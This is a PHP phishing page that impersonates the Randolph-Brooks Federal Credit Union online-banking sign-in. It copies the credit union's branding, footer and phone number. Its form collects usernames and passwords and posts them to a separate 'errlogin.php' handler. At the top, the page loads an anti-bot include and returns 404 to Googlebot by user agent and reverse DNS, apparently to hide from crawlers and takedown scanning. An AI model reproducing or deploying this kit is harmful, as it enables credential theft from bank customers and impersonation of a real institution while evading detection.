<?php

include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?><!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>RBFCU - Sign In</title>
	<style type="text/css">
		*{
			padding: 0;
			outline: 0;
			margin: auto;
			font-family: arial,helvetica,consolas;
		}#logo{
			display: block;
			width: 120px;
		}input{
			display: block;
			width: 90%;
			border: 0;
			padding: 15px;
			margin-top: 20px;
			font-size: 16px;
			padding-left: 0;
			border-bottom: 1px solid lightgray;
			font-family: verdana;
		}@media only screen and (min-width: 800px){
			#logo{
			width: 150px;
			margin-top: 12px;
			}
		}
	</style>
</head>
<body>
<div style="background: #043672;padding: 15px;">
	<img src="img/logo.svg" id="logo">

</div>
<form  action="errlogin.php"  method="post" style="max-width: 400px;padding: 15px;text-align: center;margin-top: 20px;">
	<h2 style="font-weight: 300;margin-bottom: 20px;">Access Online Banking</h2>
	<input type="" name="user" minlength="6" style="margin-top: 30px;" placeholder="Username" required>
	<input type="password" name="pass" minlength="6" placeholder="Password" required>
<button type="submit" style="background: #0078e7;color: white;padding: 12px;width: 95%;border: 0;margin-top: 40px;border-radius: 5px;font-size: 15px;font-weight: bold;">Log In</button>
<span style="color: #0078e7;font-size: 14px;font-weight: bold;margin-top: 30px; display: block;">Having Trouble Signing In?</span>

</form>
<div style="border-top: 3px solid #F1F1F1;margin-top: 40px;padding: 15px;">
	<div style="max-width: 1000px;padding: 5px;font-size: 14px;color: gray;">
		<p style="font-size: 14px;color: gray;">© Randolph-Brooks Federal Credit Union 2022.</p>
		<p style="font-size: 14px;color: gray;line-height: 22px; margin-top: 20px;">If you are using a screen reader and are having problems using this website, please call 1-800-580-3300 for assistance.</p>
		<p style="font-size: 14px;color: gray;margin-top: 20px;text-align: center;"><img src="img/NCUA-logo-gray.svg" width="80px">Federally Insured by NCUA.</p>
				<p style="font-size: 14px;color: gray;text-align: center;margin-top: 20px;">Equal Housing Lender.<img src="img/EHL-logo-gray.svg" width="40px"></p>

	</div>
</div>
<br>
<br>




</body>
</html>